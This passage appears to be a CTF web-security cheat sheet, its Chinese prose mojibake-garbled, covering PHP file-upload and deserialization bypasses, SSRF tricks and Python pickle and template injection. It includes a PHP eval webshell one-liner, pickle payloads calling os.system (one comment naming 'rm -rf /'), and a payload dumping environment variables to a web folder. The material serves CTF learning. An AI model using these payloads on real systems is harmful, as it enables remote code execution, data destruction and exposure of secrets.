<li>php<code>0x00 %00</code>ç©ºç™½å­—ç¬¦æˆªæ–­ åŸç†æ˜¯æœ€åè¢«è§£ææˆchr(0) è¿™æ˜¯ä¸€ä¸ªç©ºç™½å­—ç¬¦ï¼Œç©ºç™½å­—ç¬¦åçš„å†…å®¹ä¼šè¢«æˆªæ–­é€ æˆç»•è¿‡  æ¼æ´ç‰ˆæœ¬å¾ˆè€ä¸å¸¸è§ï¼šphpç‰ˆæœ¬å°äº5.3.4 javaç‰ˆæœ¬å°äº7u40</li>
<li><code>iconv å­—ç¬¦è½¬æ¢å¼‚å¸¸</code>é€ æˆæˆªæ–­ utf-8å­—ç¬¦é›† Â é»˜è®¤çš„å­—ç¬¦ç¼–ç èŒƒå›´çš„æ˜¯0x00-0x7f Â phpç‰ˆæœ¬ä½äº5.4  <code>123.php%df.jpg Â  123.php</code></li>
<li>æ²¡æœ‰è¿‡æ»¤<code>htmlåç¼€</code>çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨htmlæ–‡ä»¶æ¥æ‰§è¡Œxssæˆ–è€…å¯ä»¥ç›´æ¥ä¸Šä¼ ä¸€ä¸ªç”±æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„htmlæ–‡ä»¶</li>
<li>åœ¨æœ‰<code>getimagesize</code>å‡½æ•°æ£€æµ‹æ˜¯å¦æ˜¯å›¾åƒä¸­ï¼Œå¦‚æœèƒ½ç»•è¿‡è¿™ä¸ªå‡½æ•°å°±å¯ä»¥ä¸Šä¼ ä»»æ„çš„æ–‡ä»¶<br>xbmæ ¼å¼å›¾ç‰‡ ç”¨å®šä¹‰ å®½é«˜çš„æ–¹å¼å°±å¯ä»¥æ£€æµ‹</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line">auto_append_file=/<span class="built_in">var</span>/<span class="built_in">log</span>/nginx/access.<span class="built_in">log</span></span><br><span class="line">.user.ini</span><br><span class="line">#<span class="built_in">define</span>Â <span class="built_in">width</span>Â <span class="number">100</span>;</span><br><span class="line">#<span class="built_in">define</span>Â <span class="built_in">height</span>Â <span class="number">100</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<ul>
<li>å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ï¼š <a href="https://mp.weixin.qq.com/s/LLdo7obJCs-J_Ek1lFxD7g">https://mp.weixin.qq.com/s/LLdo7obJCs-J_Ek1lFxD7g</a></li>
<li><code>phar</code>æ˜¯phpä¸­ç±»ä¼¼jaråŒ…ä¸€æ ·çš„ä¸€ç§æ‰“åŒ…æ–¹å¼ï¼Œpharæ–‡ä»¶ä¸Šä¼ ç»•è¿‡çš„æœ¬è´¨å°±æ˜¯pharååºåˆ—åŒ–  <a href="https://mp.weixin.qq.com/s/LLdo7obJCs-J_Ek1lFxD7g">https://mp.weixin.qq.com/s/LLdo7obJCs-J_Ek1lFxD7g</a></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">//åˆ é™¤ä¹‹å‰çš„test.paræ–‡ä»¶(å¦‚æœæœ‰)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">//åˆ›å»ºä¸€ä¸ªpharå¯¹è±¡ï¼Œæ–‡ä»¶åå¿…é¡»ä»¥pharä¸ºåç¼€</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//å¼€å§‹å†™æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">//å†™å…¥stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//å†™å…¥meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h2><ul>
<li>php çš„ç‰¹æ€§ï¼Œå½“åºåˆ—åŒ–åå¯¹è±¡çš„å‚æ•°åˆ—è¡¨ä¸­æˆå‘˜ä¸ªæ•°å’Œå®é™…ä¸ªæ•°ä¸ç¬¦åˆæ—¶ä¼šç»•è¿‡ __weakup ();  PHP5 &lt; 5.6.25ã€PHP7 &lt; 7.0.10</li>
<li>å¦‚æœ PHP ä»£ç ä½¿ç”¨äº† <code>__autoload()</code> æˆ– <code>spl_autoload_register()</code>ï¼Œé‚£ä¹ˆåœ¨ <code>unserialize()</code> æ—¶ï¼ŒPHP ä¼šå°è¯•è‡ªåŠ¨åŠ è½½ä¸å­˜åœ¨çš„ç±»ã€‚æ”»å‡»è€…å¯èƒ½é€šè¿‡æ§åˆ¶ <code>autoload</code> æœºåˆ¶ï¼Œä½¿å…¶åŠ è½½æ¶æ„ä»£ç ã€‚  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="code"><pre><span class="line">   spl_autoload_register(function(<span class="variable">$class</span>) &#123;</span><br><span class="line">    include <span class="string">&quot;/tmp/<span class="variable">$class</span>.php&quot;</span>; <span class="regexp">//</span> å¦‚æœ <span class="class"><span class="keyword">class</span> ä¸å­˜åœ¨ï¼Œä¼šè‡ªåŠ¨å°è¯•åŠ è½½</span></span><br><span class="line"><span class="class">&#125;)</span>;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="string">&#x27;O:8:&quot;Malicious&quot;:0:&#123;&#125;&#x27;</span>); <span class="regexp">//</span>å‡è®¾ç±» Malicious ä¸å­˜åœ¨ï¼ŒPHP ä¼šé€šè¿‡å·²æ³¨å†Œçš„è‡ªåŠ¨åŠ è½½å‡½æ•°å°è¯•åŠ è½½ /tmp/Malicious.php æ–‡ä»¶</span><br></pre></td></tr></table></figure></div></li>
<li>phpåºåˆ—åŒ–ä¸­çš„è¡¨ç¤º<code>O:&lt;ç±»åé•¿åº¦&gt;:&quot;&lt;ç±»å&gt;&quot;:&lt;æˆå‘˜æ•°é‡&gt;:&#123;&lt;æˆå‘˜&gt;&#125;</code></li>
<li><code>die</code>å‡½æ•°ä¹Ÿèƒ½è°ƒç”¨<code>__toString()</code>æ–¹æ³•</li>
<li>ä¸¤ä¸ªå˜é‡åŒæ—¶æŒ‡å‘<code>åŒä¸€ä¸ªå†…å­˜åœ°å€</code>ä¹Ÿå¯ä»¥ç»•è¿‡<code>wakeup</code>,å› ä¸ºè¿™æ ·å°±æ˜¯ä¿®æ”¹å¦ä¸€ä¸ªå˜é‡ä»è€Œä¿®æ”¹è¢«ä¿®æ”¹çš„å˜é‡çš„å€¼</li>
<li>å½“ä½ è¯•å›¾è®¿é—®ä¸€ä¸ª<strong>ä¸å­˜åœ¨</strong>æˆ–<strong>ä¸å¯è®¿é—®</strong>ï¼ˆå¦‚ <code>private</code>ï¼‰çš„å±æ€§æ—¶ï¼Œ<code>__get()</code> æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚</li>
<li>åœ¨ PHP ä¸­ï¼Œ<code>__call()</code> æ˜¯ä¸€ä¸ª <strong>é­”æ³•æ–¹æ³•</strong>ï¼Œå½“è°ƒç”¨<strong>æœªå®šä¹‰</strong>æˆ–<strong>ä¸å¯è®¿é—®</strong>ï¼ˆå¦‚ <code>private</code>ï¼‰çš„æ–¹æ³•æ—¶ï¼Œå®ƒä¼šè¢«è‡ªåŠ¨è§¦å‘ã€‚</li>
<li><code>__invoke()</code> æ˜¯ä¸€ä¸ªé­”æœ¯æ–¹æ³•ï¼ˆMagic Methodï¼‰ï¼Œç”¨äºä½¿å¯¹è±¡åƒå‡½æ•°ä¸€æ ·è¢«è°ƒç”¨ã€‚å®ƒçš„ä½œç”¨æ˜¯è®©ä¸€ä¸ªå¯¹è±¡èƒ½å¤Ÿåƒæ™®é€šå‡½æ•°ä¸€æ ·æ‰§è¡Œï¼Œè€Œä¸éœ€è¦æ˜¾å¼è°ƒç”¨æ–¹æ³•ã€‚å½“<strong>è¯•å›¾æŠŠä¸€ä¸ªå¯¹è±¡å½“ä½œå‡½æ•°è°ƒç”¨</strong>æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨è§¦å‘ <code>__invoke()</code> æ–¹æ³•ã€‚</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HAXE"><figure class="iseeu highlight /haxe"><table><tr><td class="code"><pre><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span><span class="type"></span> CallableClass(); <span class="variable">$obj</span>(<span class="string">&quot;è¿™æ˜¯ __invoke è¢«è§¦å‘çš„ç¤ºä¾‹&quot;</span>); <span class="comment">// è§¦å‘ __invoke()</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>è¦æŠŠä¸€ä¸ªå¯¹è±¡èµ‹å€¼ç»™ä¸€ä¸ªå¯¹è±¡å±æ€§ï¼Œè€Œä¸”è¿˜æ˜¯ç§æœ‰çš„å±æ€§ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥èµ‹å€¼ï¼Œä¹Ÿä¸èƒ½åœ¨å¤–é¢èµ‹å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Â <code>__construct</code>Â æ„é€ å‡½æ•°æ¥èµ‹å€¼ã€‚</li>
<li>private å±æ€§çš„å†…å®¹ä¼šæœ‰ä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥æœ‰æ—¶å€™è¦ç”¨urlencodeåºåˆ—åŒ–ä¹‹åçš„å†…å®¹</li>
<li>phpä¸­çš„__setå‡½æ•°å½“è¯•å›¾ä¸ºä¸€ä¸ªæœªå®šä¹‰æˆ–ä¸å¯è®¿é—®ï¼ˆå¦‚ç§æœ‰æˆ–å—ä¿æŠ¤ï¼‰çš„å±æ€§èµ‹å€¼æ—¶ è°ƒç”¨ getä¹Ÿæ˜¯</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__get</span>(<span class="variable">$name</span>)ï¼šå½“å°è¯•è¯»å–å¯¹è±¡ä¸­æœªå®šä¹‰æˆ–ä¸å¯è®¿é—®çš„å±æ€§æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨æ­¤æ–¹æ³•ã€‚</span><br><span class="line">    </span><br><span class="line"><span class="built_in">__set</span>(<span class="variable">$name</span>, <span class="variable">$value</span>)ï¼šå½“å°è¯•ä¸ºå¯¹è±¡ä¸­æœªå®šä¹‰æˆ–ä¸å¯è®¿é—®çš„å±æ€§èµ‹å€¼æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨æ­¤æ–¹æ³•ã€‚</span><br></pre></td></tr></table></figure></div>
<p>ç¤ºä¾‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è·å–å±æ€§ &#x27;<span class="subst">$name</span>&#x27;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>] ?? <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è®¾ç½®å±æ€§ &#x27;<span class="subst">$name</span>&#x27; ä¸º &#x27;<span class="subst">$value</span>&#x27;\n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$example</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="variable">$example</span>-&gt;property = <span class="string">&#x27;value&#x27;</span>; <span class="comment">// è°ƒç”¨ __set()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$example</span>-&gt;property;      <span class="comment">// è°ƒç”¨ __get()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è®¾ç½®å±æ€§ <span class="string">&#x27;property&#x27;</span> ä¸º <span class="string">&#x27;value&#x27;</span></span><br><span class="line">è·å–å±æ€§ <span class="string">&#x27;property&#x27;</span></span><br><span class="line">value</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p><strong><code>__debugInfo()</code></strong>ï¼šä½¿ç”¨ <code>var_dump()</code> æ‰“å°å¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ã€‚<strong><code>__sleep()</code></strong>ï¼šä½¿ç”¨ <code>serialize()</code> å‡½æ•°åºåˆ—åŒ–å¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ã€‚</p>
</li>
<li><p>phpä¸­ä¸åŒå±æ€§çš„åŒºåˆ«</p>
<table>
<thead>
<tr>
<th>å±æ€§ç±»å‹</th>
<th>å¯è§æ€§</th>
<th>å‰ç¼€ç¤ºä¾‹</th>
<th>URLä¸­è¡¨ç¤º</th>
<th>ç¤ºä¾‹åºåˆ—åŒ–ç‰‡æ®µ</th>
</tr>
</thead>
<tbody><tr>
<td>Public</td>
<td>æ‰€æœ‰åœ°æ–¹å‡å¯è®¿é—®</td>
<td>æ— å‰ç¼€</td>
<td>-</td>
<td><code>s:2:&quot;op&quot;;i:2;</code></td>
</tr>
<tr>
<td>Protected</td>
<td>ç±»åŠå…¶å­ç±»å¯è®¿é—®</td>
<td><code>\0*\0</code></td>
<td><code>%00*%00</code></td>
<td><code>s:5:&quot;\0*\0op&quot;;i:2;</code></td>
</tr>
<tr>
<td>Private</td>
<td>ä»…ç±»è‡ªèº«å¯è®¿é—®</td>
<td><code>\0ç±»å\0</code></td>
<td><code>%00ç±»å%00</code></td>
<td><code>s:11:&quot;\0Test\0op&quot;;i:2;</code></td>
</tr>
</tbody></table>
</li>
</ul>
<h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><ul>
<li>ssrfä¸­æœ‰é™åˆ¶é•¿åº¦çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨0 0åœ¨linuxç³»ç»Ÿä¸­ä¼šè§£ææˆ127.0.0.1åœ¨windowsä¸­è§£ææˆ0.0.0.0</li>
<li><code>http://sudo.cc</code> å°±æ˜¯æŒ‡å‘127.0.0.1</li>
</ul>
<h2 id="ç»†èŠ‚"><a href="#ç»†èŠ‚" class="headerlink" title="ç»†èŠ‚"></a>ç»†èŠ‚</h2><ul>
<li><p>å¾—åˆ°ä¿¡æ¯æ²¡æœ‰flagå­—æ ·çš„æ—¶å€™æƒ³æƒ³æ˜¯ä¸æ˜¯base64ç­‰ç¼–ç </p>
</li>
<li><p>phpä¼ªåè®®æ— æ³•ä½¿ç”¨å°±ç”¨æ—¥å¿—æ³¨å…¥ èšå‰‘ä¸­çš„httpsè¯ä¹¦å¿½ç•¥æ‰“å¼€  åšè¿‡ä¸€é¢˜é™åˆ¶äº†æ˜¾ç¤ºä¸ªæ•° æ‰€ä»¥ä¸èƒ½å°è¯•å¤ªå¤š</p>
</li>
<li><p>å†™å…¥çš„ <code>session</code> é©¬ä¸Šåˆä¼šè¢«åˆ é™¤ï¼Œä½¿ç”¨æˆ‘ä»¬åˆ©ç”¨ bp ä¸æ–­çš„å‘åŒ…</p>
</li>
<li><p>urlåœ¨å­—ç¬¦å‰åŠ <code>~</code>å°±æ˜¯å–åï¼Œå¯ä»¥ç”¨äºå­—æ¯ç»•è¿‡,å› ä¸ºå–åçš„ä¹‹åçš„å­—ç¬¦å¤§éƒ¨åˆ†éƒ½æ˜¯ä¸å¯è§å­—ç¬¦</p>
  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">   <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div></li>
<li><p>phpä¸­çš„<code>Â $strÂ =Â preg_replace(&#39;/NSSCTF/&#39;,&quot;&quot;,$_GET[&#39;str&#39;]);</code>å¦‚æœæ˜¯å°†æ•æ„Ÿè¯ç½®æ¢ä¸ºç©ºï¼Œå°±å¯ä»¥ç”¨åŒå†™ç½®æ¢ï¼Œè¿™é‡Œå°±æ˜¯<code>NSSNSSCTFCTF</code></p>
</li>
<li><p>åªèƒ½å†™ä¸‰ä¸ªå­—ç¬¦ä½†æ˜¯æ¯”ä¸€ä¸ªå¾ˆå¤§çš„æ•°å­—å¤§å¯ä»¥ç”¨<code>ç§‘å­¦è®¡æ•°æ³•</code>9e9</p>
</li>
<li><p><code>%09</code>çš„urlè§£ç æ˜¯&#x2F;tï¼ˆåˆ¶è¡¨ç¬¦ï¼‰æœ‰æ—¶å€™ç©ºæ ¼ç»•è¿‡${IFS}ä¹Ÿä¸è¡Œçš„æ—¶å€™ç”¨è¿™ä¸ª</p>
</li>
<li><p>ä¸€äº›é¢˜ç›®ä¸­å¦‚æœè¿‡æ»¤äº†?æˆ–è€…phpã€‚åˆè¦ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œå¯ä»¥ä¸Šä¼ <code>scriptç‰ˆæœ¬</code>çš„</p>
  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;a&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li>
<li><p>éƒ½æ˜¯ä¸¤ä¸ªæ•°å­—ä¸€ç»„çš„åŠ å¯†å­—ç¬¦ä¸²ï¼Œä¸ä¸€å®šæ˜¯hexï¼Œè¿˜æœ‰å¯èƒ½æ˜¯<code>tapcode</code>æ•²å‡»ç </p>
</li>
<li><p>sqlæ³¨å…¥ä¸­ï¼Œå¦‚æœ<code>or</code>æˆ–è€…unionè¿™ç§å…³é”®å­—è¢«è¿‡æ»¤å°è¯•åŒå†™ç»•è¿‡,è€Œä¸”æ¯”å¦‚orè¢«è¿‡æ»¤é‚£informationé‡Œé¢å«orä¹Ÿä¼šè¢«è¿‡æ»¤</p>
</li>
<li><p>èšå‰‘æˆåŠŸè¿æ¥ä¹‹åå¦‚æœæ— æ³•çœ‹åˆ°é‡Œé¢çš„æ–‡ä»¶ï¼Œè¯•è¯•<code>è™šæ‹Ÿç»ˆç«¯</code>ä¸­æŸ¥çœ‹</p>
</li>
<li><p>å¦‚æœcatæ— æ³•æŸ¥çœ‹ï¼Œå°è¯•<code>tac</code></p>
</li>
<li><p><code>mt_srand (seed)</code> ç”¨äº åˆå§‹åŒ–éšæœºæ•°ç”Ÿæˆå™¨ï¼Œå…¶ä¸­ seed æ˜¯éšæœºæ•°ç§å­ã€‚å½±å“ï¼šå¦‚æœä½¿ç”¨ç›¸åŒçš„ seedï¼Œé‚£ä¹ˆåç»­è°ƒç”¨ mt_rand () ç”Ÿæˆçš„éšæœºæ•° å§‹ç»ˆç›¸åŒã€‚</p>
</li>
<li><p>æœ‰æ—¶<code>é¡µé¢æºä»£ç </code>ä¸­æœ‰å¯ä»¥è®¿é—®çš„æºä»£ç æ–‡ä»¶</p>
</li>
<li><p>åŸå§‹æŠ“åŒ…ä¸­çš„æ•°æ®å¦‚æœæ˜¯URLç¼–ç ï¼Œåˆ™å‘é€payloadä¹Ÿè¦urlç¼–ç </p>
</li>
<li><p>æ³¨æ„é¢˜ç›®pythonæ‰§è¡Œçš„ç‰ˆæœ¬ä¸åŒï¼Œæœ‰çš„é¢˜ç›®ç”¨python2æ‰§è¡Œçš„ï¼Œæ¯”å¦‚éšæœºç§å­ç”Ÿæˆä¸­ä¸¤ä¸ªç‰ˆæœ¬çš„pythonç”Ÿæˆçš„ç»“æœå°±ä¸ä¸€æ ·</p>
</li>
<li><p>åœ¨ä¸€äº›æ— å›æ˜¾çš„é¢˜ç›®ä¸­ï¼Œå¦‚æœè¦æŠŠè¿”å›å†…å®¹å†™å›åˆ°æ–‡ä»¶ï¼Œæ³¨æ„flaskæ¡†æ¶çš„æ ¹ç›®å½•å¾ˆå¯èƒ½æ˜¯&#x2F;app å†™åˆ°é™æ€æ–‡ä»¶<code>/app/static/xxx</code>ä¸­</p>
</li>
<li><p>hexåˆ†ä¸ºæ™®é€šçš„hexå’Œasciihex  å­—ç¬¦ä¸²çš„æ—¶å€™ç”¨asciihex ASCII Hex ç”¨äºå­—ç¬¦ä¸²å­˜å‚¨å’Œä¼ è¾“ï¼Œå› ä¸ºå®ƒèƒ½ä¿è¯æ•°æ®æ˜¯å¯è¯»çš„ ASCII å­—ç¬¦ï¼Œä¸ä¼šå¼•èµ·åè®®è§£æé—®é¢˜ã€‚ æ¯”å¦‚ä¸€ä¸ªhex 41æ‹†æˆå­—ç¬¦4å’Œ1 ç„¶åæ‰¾åˆ°å¯¹åº”çš„asciiç  å°±æ˜¯3431</p>
</li>
<li><p>æœ‰æ—¶å€™æ‰§è¡Œenv å¯èƒ½å°±ä¼šå‡ºflag</p>
</li>
</ul>
<h2 id="å…¶ä»–è¯­è¨€çŸ¥è¯†"><a href="#å…¶ä»–è¯­è¨€çŸ¥è¯†" class="headerlink" title="å…¶ä»–è¯­è¨€çŸ¥è¯†"></a>å…¶ä»–è¯­è¨€çŸ¥è¯†</h2><ul>
<li>åœ¨ Python æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œâ€.â€ è¡¨ç¤ºåŒ¹é…é™¤äº†æ¢è¡Œç¬¦ä¹‹å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œâ€<em>â€œ è¡¨ç¤ºåŒ¹é…å‰é¢çš„å­—ç¬¦é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚å› æ­¤ï¼Œâ€.</em>â€œ è¡¨ç¤ºåŒ¹é…ä»»æ„é•¿åº¦çš„å­—ç¬¦åºåˆ—ï¼Œè¿™ä¹Ÿè¢«ç§°ä¸ºè´ªå©ªåŒ¹é… (greedy matching)ã€‚ æ³¨æ„åˆ°è¿™ä¸ªé™¤äº†æ¢è¡Œç¬¦ä»¥å¤–ï¼Œæ‰€ä»¥å¯ä»¥ç”¨<code>%a</code>ç»•è¿‡ä¸€äº›æ­£åˆ™åŒ¹é…ï¼Œå‰é¢æ˜¯æ¢è¡Œå°±åŒ¹é…ä¸åˆ°</li>
<li>å‚æ•°ä¼ é€’æ˜¯å¤§æ‹¬å·çš„æ—¶å€™ï¼Œè€ƒè™‘åŸå‹é“¾æ±¡æŸ“ï¼Œä½¿ç”¨çš„æ˜¯<code>__proto__</code>è¿™ä¸ªç§æœ‰å±æ€§,ç”¨è¿™ä¸ªä¿®æ”¹åŸå‹çš„å±æ€§ï¼Œå½“å†åˆ›å»ºä¸€ä¸ªå®ä¾‹çš„æ—¶å€™ï¼Œå°±ä¼šç»§æ‰¿è¢«ä¿®æ”¹è¿‡çš„åŸå‹çš„å±æ€§</li>
<li>pythonä¸­ï¼š<br>  <code>__class__</code> è·å–å¯¹è±¡çš„ç±»ã€‚<br>  <code>__init__</code> è·å–ç±»çš„æ„é€ æ–¹æ³•ã€‚<br>  <code>__globals__</code> è·å–è¯¥ç±»<strong>å®šä¹‰æ—¶çš„å…¨å±€å˜é‡</strong>ã€‚<br>  ç¤ºä¾‹  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">f1ag = request.<span class="keyword">args</span>.<span class="built_in">get</span>(<span class="string">&#x27;f1ag&#x27;</span>) <span class="built_in">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">exp</span> = request.<span class="keyword">args</span>.<span class="built_in">get</span>(<span class="string">&#x27;exp&#x27;</span>) <span class="built_in">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">message = <span class="string">&quot;Your flag is &#123;0&#125;&quot;</span> + <span class="built_in">exp</span></span><br><span class="line"></span><br><span class="line">?flag=<span class="number">1</span>&amp;<span class="built_in">exp</span>=&#123;<span class="number">0</span>.__class__.__init__.__globals__&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>flaskçš„pinç æ³„æ¼å¯ä»¥å» &#x2F;console &#x2F;debuggerç•Œé¢æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä½†æ˜¯æ‰§è¡Œå‘½ä»¤ä¸èƒ½ç”¨os.system åªä¼šè¿”å›0 è¦ç”¨os.popen().read()</li>
<li>python ä¸­çš„pickleååºåˆ—åŒ–æ¼æ´ï¼š pickle.loads()æ˜¯ä¸å®‰å…¨çš„ï¼ å®ƒå¯ä»¥æ‰§è¡Œä»»æ„ Python ä»£ç ï¼Œå¦‚æœæ”»å‡»è€…æ„é€ æ¶æ„çš„ pickle æ•°æ®ï¼Œå°±èƒ½è¿œç¨‹æ‰§è¡Œå‘½ä»¤(RCE)<br>   <strong>åˆ©ç”¨æ–¹å¼</strong> ï¼šæ”»å‡»è€…å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„ <code>pickle</code> å¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ª <code>os.system(&quot;command&quot;)</code>ï¼Œç„¶åå°†å…¶ Base64 ç¼–ç å¹¶æäº¤åˆ° <code>/import</code> ç«¯ç‚¹ã€‚  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">import</span> pickle</span><br><span class="line">   <span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&quot;touch /tmp/hacked&quot;</span>,))  <span class="comment"># æˆ–è€… &quot;rm -rf /&quot;</span></span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(pickle.dumps(Exploit())).decode()	</span><br><span class="line"><span class="built_in">print</span>(payload)  <span class="comment"># ç”Ÿæˆæ¶æ„ Base64 å­—ç¬¦ä¸²</span></span><br></pre></td></tr></table></figure></div>
  opcodeç‰ˆæœ¬  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,pickletools  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;cos  </span></span><br><span class="line"><span class="string">system  </span></span><br><span class="line"><span class="string">(S&#x27;mkdir static &amp;&amp; set &gt; ./static/1&#x27;  </span></span><br><span class="line"><span class="string">tR.  </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>  </span><br><span class="line">pickletools.dis(opcode)  </span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(opcode).decode())</span><br></pre></td></tr></table></figure></div></li>
